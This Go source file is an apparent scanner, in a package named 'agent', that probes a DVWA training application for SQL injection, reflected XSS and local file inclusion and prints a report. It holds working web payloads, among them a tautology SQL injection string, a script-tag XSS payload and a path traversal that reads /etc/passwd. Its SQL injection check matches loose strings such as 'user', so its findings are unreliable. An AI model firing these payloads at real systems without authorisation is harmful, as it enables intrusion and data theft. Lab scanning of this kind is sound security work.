package agent

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

func SimpleDVWAScan(baseURL string) (string, error) {
	result := fmt.Sprintf(strings.Repeat("=", 80) + "\n")
	result += "                     SIMPLE DVWA VULNERABILITY SCAN\n"
	result += strings.Repeat("=", 80) + "\n\n"
	result += fmt.Sprintf("Target:    %s\n", baseURL)
	result += fmt.Sprintf("Scan Time: %s\n\n", time.Now().Format(time.RFC1123))
	
	var vulnerabilities []string
	
	// Test 1: SQL Injection (without login, just try)
	result += strings.Repeat("-", 80) + "\n"
	result += "[1] Testing SQL Injection...\n"
	sqliResult := testSQLi(baseURL)
	if sqliResult != "" {
		result += "    ✅ VULNERABLE: " + sqliResult + "\n"
		vulnerabilities = append(vulnerabilities, "SQL Injection (CRITICAL)")
	} else {
		result += "    ❌ Not vulnerable (or needs login)\n"
	}
	
	// Test 2: XSS
	result += "\n[2] Testing XSS (Reflected)...\n"
	xssResult := testXSS(baseURL)
	if xssResult != "" {
		result += "    ✅ VULNERABLE: " + xssResult + "\n"
		vulnerabilities = append(vulnerabilities, "XSS (HIGH)")
	} else {
		result += "    ❌ Not vulnerable (or needs login)\n"
	}
	
	// Test 3: File Inclusion
	result += "\n[3] Testing File Inclusion...\n"
	lfiResult := testLFI(baseURL)
	if lfiResult != "" {
		result += "    ✅ VULNERABLE: " + lfiResult + "\n"
		vulnerabilities = append(vulnerabilities, "File Inclusion (HIGH)")
	} else {
		result += "    ❌ Not vulnerable (or needs login)\n"
	}
	
	result += "\n" + strings.Repeat("-", 80) + "\n"
	result += fmt.Sprintf("SUMMARY: Found %d potential vulnerabilities\n", len(vulnerabilities))
	
	if len(vulnerabilities) > 0 {
		result += "\nVulnerabilities Found:\n"
		for _, v := range vulnerabilities {
			result += fmt.Sprintf("  - %s\n", v)
		}
	}
	
	result += "\n" + strings.Repeat("=", 80) + "\n"
	
	return result, nil
}

func testSQLi(baseURL string) string {
	testURL := baseURL + "/vulnerabilities/sqli/?id=1%27+OR+%271%27=%271&Submit=Submit"
	
	resp, err := http.Get(testURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	// Check for SQLi patterns
	patterns := []string{
		"First name",
		"Surname",
		"ID:",
		"user",
		"You have an error in your SQL syntax",
	}
	
	for _, p := range patterns {
		if strings.Contains(string(body), p) {
			return fmt.Sprintf("SQLi detected at %s", testURL)
		}
	}
	
	return ""
}

func testXSS(baseURL string) string {
	testURL := baseURL + "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"
	
	resp, err := http.Get(testURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	if strings.Contains(string(body), "<script>alert(1)</script>") {
		return fmt.Sprintf("XSS reflected at %s", testURL)
	}
	
	return ""
}

func testLFI(baseURL string) string {
	testURL := baseURL + "/vulnerabilities/fi/?page=../../../../etc/passwd"
	
	resp, err := http.Get(testURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	if strings.Contains(string(body), "root:") || strings.Contains(string(body), "daemon:") {
		return fmt.Sprintf("LFI detected at %s", testURL)
	}
	
	return ""
}